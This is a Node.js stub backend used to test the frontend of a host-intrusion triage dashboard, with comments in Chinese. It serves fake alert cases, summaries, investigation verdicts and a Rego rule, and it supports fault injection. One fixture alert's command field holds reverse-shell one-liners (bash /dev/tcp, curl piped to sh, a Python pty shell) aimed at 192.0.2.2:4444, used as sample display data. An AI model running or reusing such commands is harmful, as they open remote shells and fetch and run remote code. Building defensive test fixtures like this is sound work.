// P003-T015 测试方自建桩后端（不是真后端；真后端要牧云/模型凭据，本机没有）。
// 形状逐字照 openapi.yaml 的 TriageSummary / TriageCaseListItem / TriageCase /
// Investigation / FalsePositiveRecord / CaseMaintenance / MaintenanceSide。
// 额外：全量请求日志（含是否带 Authorization）+ 故障注入，用来验 A1/A4「不发 /api/alerts」与六格状态。
//
// 起法：node evidence/test/P003-T015/stub-api.mjs 18099
import { createServer } from "node:http";

const PORT = Number(process.argv[2] ?? 18099);
const USER = "hids";
const PASS = "hids-2026";

// ---- 故障注入开关（由测试脚本经 /__ctl 改；页面只能看到 /api/* 的效果）----
const mode = {
  cases: "ok", // ok | 503 | empty
  status: "ok", // ok | empty | 503（告警页队列条与总览聚合共用这一条路径）
  all: "ok", // ok | 503 | 401（总览六源全挂 / 登录已失效）
  long: false, // true 时长字段（造 long-content 格）
  delayMs: 0, // 所有 /api 响应延迟（造 loading 格）
  delayByHost: {}, // { "10.0.0.5": 1800 } 只给该 ?host= 的请求加延迟（造旧响应晚到）
};

const log = []; // { method, path, auth, ts }

const ctl = (res, body) => {
  res.writeHead(200, { "content-type": "application/json" });
  res.end(JSON.stringify(body));
};

// ---- 数据 ----
const SUMMARY_FULL = {
  initialized: true,
  enabled: true,
  input_mode: "syslog",
  syslog: { listening: true, bind: "udp://127.0.0.1:15514", error: null },
  last_poll_at: null,
  last_received_at: "2026-11-17T10:02:11.000Z",
  last_error: null,
  since: null,
  counts: { queued: 1, running: 0, done: 3, failed: 0 },
  verdict_counts: { threat: 3, uncertain: 5, false_positive: 4, review: 8 },
  type_counts: { revshell: 6, honeypot: 4, webshell: 3, brute_force: 3, malware: 2, abnormal_login: 1, network_audit: 1 },
};
// 带 since 时换一组数（证明参数下推且聚合按窗口算）
const SUMMARY_WINDOW = {
  ...SUMMARY_FULL,
  since: "2026-11-16T10:00:00.000Z",
  counts: { queued: 0, running: 0, done: 4, failed: 1 },
  verdict_counts: { threat: 1, uncertain: 2, false_positive: 2, review: 0 },
  type_counts: { revshell: 3, honeypot: 2, webshell: 1 },
};
const SUMMARY_EMPTY = {
  ...SUMMARY_FULL,
  counts: { queued: 0, running: 0, done: 0, failed: 0 },
  verdict_counts: { threat: 0, uncertain: 0, false_positive: 0, review: 0 },
  type_counts: {},
  last_received_at: null,
};

const LONG_CMD =
  "bash -i >& /dev/tcp/192.0.2.2/4444 0>&1 ; curl -s http://192.0.2.2/x.sh | sh ; " +
  "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"192.0.2.2\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'";

const CASES = [
  {
    alert_id: "syslog:revshell:a1b2c3d4e5f60718:1763373600:aaa1",
    matched_alert_id: "1731800000000-1",
    result_alert_id: "syslog:revshell:a1b2c3d4e5f60718:1763373600:aaa1",
    status: "done",
    stage: "研判完成",
    detail: "研判完成：反弹 shell 外联 192.0.2.2:4444，命中规则 ssh_bruteforce",
    created_at: "2026-11-17T10:00:00.000Z",
    updated_at: "2026-11-17T10:01:30.000Z",
    saved_at: "2026-11-17T10:01:30.000Z",
    case_dir: "/var/lib/hids/cases/cloudwalker-revshell/1763373600-aaa1",
    repeat_count: 3,
    verdict: "threat",
    verdict_label: "真实威胁",
    summary: "主机 10.0.0.5 出现反弹 shell，外联 192.0.2.2:4444，证据链完整。",
    report: "【短结果】判定为真实威胁：反弹 shell 成功建立。",
    missing_evidence: ["进程树", "落地文件哈希"],
    next_actions: ["隔离主机 10.0.0.5", "封禁 192.0.2.2:4444"],
    evidence_refs: [{ evidence_id: "cw:1", pointer: "/hosts/0/processes/1" }],
    evidence: [
      { evidence_id: "cw:1", tool: "cloudwalker.query", fetched_at: "2026-11-17T10:00:40.000Z", sha256: "a".repeat(64) },
      { evidence_id: "cw:2", tool: "cloudwalker.query", fetched_at: "2026-11-17T10:00:55.000Z", sha256: "b".repeat(64) },
      { evidence_id: "wiki:1", tool: "wiki.read", fetched_at: "2026-11-17T10:01:10.000Z", sha256: "c".repeat(64) },
    ],
    verified_facts: 2,
    evidence_sources: 2,
    msgid: "cloudwalker-revshell",
    decision_source: "ai",
    rule_id: "ssh_bruteforce",
    event_time: 1763373600,
    host_ip: "10.0.0.5",
    source_ip: "192.0.2.2",
    command: LONG_CMD,
  },
  {
    alert_id: "syslog:honeypot:b2c3d4e5f6071829:1763377200:bbb2",
    matched_alert_id: null,
    result_alert_id: null,
    status: "done",
    stage: "研判完成",
    detail: "研判完成：蜜罐触达，无后续动作",
    created_at: "2026-11-17T11:00:00.000Z",
    updated_at: "2026-11-17T11:00:40.000Z",
    saved_at: "2026-11-17T11:00:40.000Z",
    case_dir: null,
    repeat_count: 1,
    verdict: "uncertain",
    verdict_label: "存疑",
    summary: "蜜罐收到探测请求，未观察到有效利用。",
    report: null,
    missing_evidence: [],
    next_actions: [],
    evidence_refs: [],
    evidence: [],
    verified_facts: 0,
    evidence_sources: 0,
    msgid: "cloudwalker-honeypot",
    decision_source: "ai",
    rule_id: null,
    event_time: 1763377200,
    host_ip: "10.0.0.6",
    source_ip: "198.51.100.9",
    command: null,
  },
  {
    alert_id: "syslog:webshell:c3d4e5f607182930:1763380800:ccc3",
    matched_alert_id: null,
    result_alert_id: null,
    status: "queued",
    stage: "等待研判",
    detail: "已入队，等待研判",
    created_at: "2026-11-17T12:00:00.000Z",
    updated_at: "2026-11-17T12:00:00.000Z",
    saved_at: null,
    case_dir: null,
    repeat_count: 12,
    verdict: null,
    verdict_label: null,
    summary: null,
    report: null,
    missing_evidence: [],
    next_actions: [],
    evidence_refs: [],
    evidence: [],
    verified_facts: 0,
    evidence_sources: 0,
    msgid: "cloudwalker-webshell",
    decision_source: "ai",
    rule_id: null,
    event_time: 1763380800,
    host_ip: "10.0.0.7",
    source_ip: "203.0.113.4",
    command: null,
  },
  {
    alert_id: "syslog:brute-force:d4e5f60718293a4b:1763384400:ddd4",
    matched_alert_id: null,
    result_alert_id: null,
    status: "done",
    stage: "研判完成",
    detail: "研判完成：登录失败暴涨，已人工登记误报",
    created_at: "2026-11-17T13:00:00.000Z",
    updated_at: "2026-11-17T13:10:00.000Z",
    saved_at: "2026-11-17T13:01:00.000Z",
    case_dir: null,
    repeat_count: 2,
    verdict: "false_positive",
    verdict_label: "误报",
    summary: "扫描器误触发的登录失败。",
    report: null,
    missing_evidence: [],
    next_actions: [],
    evidence_refs: [],
    evidence: [],
    verified_facts: 0,
    evidence_sources: 0,
    msgid: "cloudwalker-brute-force",
    decision_source: "human",
    rule_id: null,
    event_time: 1763384400,
    host_ip: "10.0.0.8",
    source_ip: "203.0.113.9",
    command: null,
    feedback: { reason: "运维扫描器在做登录巡检，不是攻击", who: "hids", recorded_at: "2026-11-17T13:10:00.000Z" },
    maintenance: { status: "updated", rule: { status: "updated" }, wiki: { status: "updated" } },
  },
];

const MSGID_TYPE = {
  "cloudwalker-webshell": "webshell",
  "cloudwalker-honeypot": "honeypot",
  "cloudwalker-suspicious-command": "suspicious_operation",
  "cloudwalker-abnormal-login": "abnormal_login",
  "cloudwalker-brute-force": "brute_force",
  "cloudwalker-revshell": "revshell",
  "cloudwalker-malware": "malware",
  "cloudwalker-elevation-process": "elevation_process",
  "cloudwalker-abnormal-network": "network_audit",
};

const REGO = `package hids.rules.ssh_bruteforce

default hit := false

hit if {
  input.msgid == "cloudwalker-brute-force"
  count(input.payload.attempts) >= 5
}`;

const INVESTIGATIONS = {
  "syslog:revshell:a1b2c3d4e5f60718:1763373600:aaa1": {
    alert_id: "syslog:revshell:a1b2c3d4e5f60718:1763373600:aaa1",
    mode: "triage",
    saved_at: "2026-11-17T10:01:30.000Z",
    verdict: {
      verdict: "threat",
      verdict_label: "真实威胁",
      summary: "主机 10.0.0.5 上出现反弹 shell，外联 192.0.2.2:4444，命令行与进程树一致，判定真实威胁。",
      report: "一句话：反弹 shell 已建立，建议立即隔离。",
      claims: [
        { text: "10.0.0.5 上的 bash 进程持有指向 192.0.2.2:4444 的 socket", citations: [{ evidence_id: "cw:1" }] },
        { text: "同一时间窗口内该主机没有合法运维任务", citations: [{ evidence_id: "cw:2" }] },
      ],
      missing_evidence: ["进程树", "落地文件哈希"],
      rego: { status: "matched", rule_ids: ["ssh_bruteforce"] },
      wiki: {
        consulted: ["honeypot/HP-10.md", "recon/R-3.md"],
        adopted: ["honeypot/HP-10.md"],
        reason: "本页判据与本次外联行为一致",
      },
    },
    review: { assessment: "supported", concerns: [], missing_evidence: [] },
    validation: { ok: true, errors: [] },
    required_evidence: [
      { id: "process-tree", label: "进程树", tool: "cloudwalker.query", scope: "10.0.0.5", status: "done" },
    ],
  },
  "syslog:honeypot:b2c3d4e5f6071829:1763377200:bbb2": {
    alert_id: "syslog:honeypot:b2c3d4e5f6071829:1763377200:bbb2",
    mode: "triage",
    saved_at: "2026-11-17T11:00:40.000Z",
    verdict: {
      verdict: "uncertain",
      verdict_label: "存疑",
      summary: "蜜罐只收到探测请求。",
      report: "一句话：没有有效利用痕迹。",
      claims: [],
      missing_evidence: [],
      rego: { status: "none" },
      wiki: { consulted: ["honeypot/HP-2.md"], adopted: [], reason: "没有采纳页：蜜罐页只作背景阅读" },
    },
    review: { assessment: "supported", concerns: [], missing_evidence: [] },
    validation: { ok: true, errors: [] },
    required_evidence: [],
  },
};

const sessionOk = (req) => {
  const h = req.headers.authorization ?? "";
  if (!h.startsWith("Basic ")) return false;
  const [u, p] = Buffer.from(h.slice(6), "base64").toString("utf8").split(":");
  return u === USER && p === PASS;
};

const json = (res, code, body, extra = {}) => {
  res.writeHead(code, { "content-type": "application/json", ...extra });
  res.end(JSON.stringify(body));
};

const filterCases = (q) => {
  let rows = CASES.map((c) => ({ ...c }));
  if (mode.cases === "empty") rows = [];
  if (q.verdict) {
    rows = rows.filter((c) => {
      const v = c.verdict ?? "review";
      return v === q.verdict;
    });
  }
  if (q.type) rows = rows.filter((c) => MSGID_TYPE[c.msgid] === q.type);
  if (q.host) rows = rows.filter((c) => c.host_ip === q.host);
  if (q.from) rows = rows.filter((c) => Number(c.event_time) >= Number(q.from));
  if (q.to) rows = rows.filter((c) => Number(c.event_time) <= Number(q.to));
  if (q.sort === "verdict") {
    const rank = { threat: 0, uncertain: 1, false_positive: 2, review: 3 };
    rows.sort((a, b) => rank[a.verdict ?? "review"] - rank[b.verdict ?? "review"] || Number(b.event_time) - Number(a.event_time));
  } else if (q.sort === "time") {
    rows.sort((a, b) => Number(b.event_time) - Number(a.event_time));
  }
  return rows;
};

const readBody = (req) => {
  if (req._body !== undefined) return Promise.resolve(req._body);
  return new Promise((ok) => {
    let raw = "";
    req.on("data", (c) => (raw += c));
    req.on("end", () => {
      const parsed = (() => {
        try {
          return raw ? JSON.parse(raw) : {};
        } catch {
          return { __raw: raw };
        }
      })();
      req._body = parsed;
      req._bodyRaw = raw;
      ok(parsed);
    });
  });
};

const server = createServer(async (req, res) => {
  const url = new URL(req.url, "http://127.0.0.1");
  const path = url.pathname;

  // 控制面：不挂 /api，不进请求日志
  if (path.startsWith("/__ctl")) {
    if (path === "/__ctl/log") return ctl(res, { requests: log });
    if (path === "/__ctl/reset-log") {
      log.length = 0;
      return ctl(res, { ok: true });
    }
    if (path === "/__ctl/mode") {
      Object.assign(mode, await readBody(req));
      return ctl(res, { mode });
    }
    if (path === "/__ctl/reset-data") {
      CASES[0].verdict = "threat";
      CASES[0].verdict_label = "真实威胁";
      CASES[0].maintenance = undefined;
      CASES[0].decision_source = "ai";
      return ctl(res, { ok: true });
    }
    res.writeHead(404).end();
    return;
  }

  if (!path.startsWith("/api/")) {
    res.writeHead(404, { "content-type": "text/plain" }).end("not found");
    return;
  }

  if (req.method === "POST") await readBody(req);
  log.push({
    method: req.method,
    path: req.url,
    auth: Boolean(req.headers.authorization),
    body: req._bodyRaw ?? null,
    ts: Date.now(),
  });
  if (mode.delayMs) await new Promise((ok) => setTimeout(ok, mode.delayMs));

  const q = Object.fromEntries(url.searchParams);
  // 复审轮：按 ?host= 的查询值注入额外延迟（造「旧响应晚到」，验 loadSeq 丢弃旧响应）
  if (q.host && mode.delayByHost && mode.delayByHost[q.host])
    await new Promise((ok) => setTimeout(ok, Number(mode.delayByHost[q.host])));

  // 登录
  if (path === "/api/session") {
    if (!sessionOk(req)) {
      res.writeHead(401, { "www-authenticate": 'Basic realm="hids"', "content-type": "text/plain; charset=utf-8" });
      return res.end("需要登录后访问");
    }
    return json(res, 200, { authenticated: true, user: USER, role: "operator" });
  }

  if (mode.all === "503") return json(res, 503, { error: "桩后端注入：全源失败" });
  if (mode.all === "401") {
    res.writeHead(401, { "www-authenticate": 'Basic realm="hids"', "content-type": "text/plain; charset=utf-8" });
    return res.end("需要登录后访问");
  }

  // A1：总览聚合
  if (path === "/api/agent/triage/status") {
    if (mode.status === "503") return json(res, 503, { error: "研判队列没有初始化" });
  if (mode.long) return json(res, 200, { ...SUMMARY_FULL, last_error: "上一条报文处理失败：" + "规则评估超时；".repeat(40) });
    if (mode.status === "empty") return json(res, 200, SUMMARY_EMPTY);
    return json(res, 200, q.since ? SUMMARY_WINDOW : SUMMARY_FULL);
  }

  // A2：研判记录列表
  if (path === "/api/agent/triage/cases") {
    if (mode.cases === "503") return json(res, 503, { error: "服务端没有启用自动研判" });
    const rows = filterCases(q);
    const offset = Number(q.offset ?? 0);
    const count = Number(q.count ?? 20);
    return json(res, 200, { cases: rows.slice(offset, offset + count), total: rows.length });
  }

  // 误报登记
  const fp = path.match(/^\/api\/agent\/triage\/(.+)\/false-positive$/);
  if (fp) {
    if (req.method !== "POST") return json(res, 405, { error: "方法不允许" });
    const id = decodeURIComponent(fp[1]);
    const body = await readBody(req);
    const rec = CASES.find((c) => c.alert_id === id);
    if (!rec) return json(res, 404, { error: "没有这条研判记录" });
    if (rec.status === "queued" || rec.status === "running") return json(res, 409, { error: "研判还没结束，不能登记误报" });
    const reason = String(body.reason ?? "");
    if (reason.length < 10 || reason.length > 4000) return json(res, 400, { error: "误报理由必须为 10 到 4000 字" });
    rec.verdict = "false_positive";
    rec.verdict_label = "误报";
    rec.decision_source = "human";
    rec.feedback = { reason, who: USER, recorded_at: new Date().toISOString() };
    rec.maintenance = { status: "updating", rule: { status: "updating" }, wiki: { status: "updating" } };
    return json(res, 202, {
      alert_id: id,
      verdict: { verdict: "false_positive", verdict_label: "误报", source: "human" },
      feedback: rec.feedback,
      maintenance: rec.maintenance,
    });
  }

  // 单条研判记录（详情首屏）与重新入队
  const one = path.match(/^\/api\/agent\/triage\/(.+)$/);
  if (one) {
    const id = decodeURIComponent(one[1]);
    const rec = CASES.find((c) => c.alert_id === id);
    if (req.method === "POST") {
      if (!rec) return json(res, 404, { error: "没有这条研判记录" });
      rec.status = "queued";
      rec.stage = "等待研判";
      rec.verdict = null;
      rec.verdict_label = null;
      return json(res, 202, rec);
    }
    if (!rec) return json(res, 200, { alert_id: id, status: "not_queued" });
    return json(res, 200, {
      ...rec,
      steps: [
        { stage: "接收报文", detail: "收到 syslog 报文", at: "2026-11-17T10:00:00.000Z" },
        { stage: "规则评估", detail: "命中 ssh_bruteforce", at: "2026-11-17T10:00:20.000Z" },
        { stage: "完成研判", detail: "结论：真实威胁", at: "2026-11-17T10:01:30.000Z" },
      ],
    });
  }

  // A3：研判结果（含 rego / wiki）
  const inv = path.match(/^\/api\/agent\/investigations\/(.+)$/);
  if (inv) {
    const id = decodeURIComponent(inv[1]);
    const found = INVESTIGATIONS[id];
    if (!found) return json(res, 404, { error: "没有研判结果" });
    return json(res, 200, found);
  }

  // A3：规则原文
  const rule = path.match(/^\/api\/rules\/(.+)$/);
  if (rule) {
    const id = decodeURIComponent(rule[1]);
    if (id !== "ssh_bruteforce") return json(res, 404, { error: "没有这条规则" });
    return json(res, 200, {
      id,
      name: "SSH 暴力破解",
      description: "同窗口登录失败次数超过阈值",
      file: "ssh_bruteforce.rego",
      rego: REGO,
    });
  }

  // trace 白板：404（区块隐藏，不挡页面）
  if (path.startsWith("/api/trace/boards/")) return json(res, 404, { error: "还没有白板" });

  // 总览其余五源
  if (path === "/api/status") return json(res, 200, { configured: true, connected: true, reason: null });
  if (path === "/api/agent/status")
    return json(res, 200, {
      configured: true,
      prompt_version: mode.long
        ? "p-2026.11.17-rc3+build.4871.very-long-version-token-that-should-be-truncated-visually-only-" + "x".repeat(60)
        : "p-2026.11.17",
    });
  if (path === "/api/agent/tools") return json(res, 200, { count: 7 });
  if (path === "/api/triage/rules") return json(res, 200, { revision: "r-41" });
  if (path === "/api/updates") return json(res, 200, { revision: "u-9" });

  // A4：牧云现查（演示页用；主列表/总览不许碰这一路）
  if (path === "/api/alerts") return json(res, 503, { error: "服务端尚未配置牧云接口，取不到告警" });
  if (/^\/api\/alerts\/.+/.test(path)) return json(res, 502, { error: "牧云接口不可达" });

  return json(res, 404, { error: `桩后端没有这条路：${path}` });
});

server.listen(PORT, "127.0.0.1", () => {
  console.log(`stub-api listening on http://127.0.0.1:${PORT}`);
});
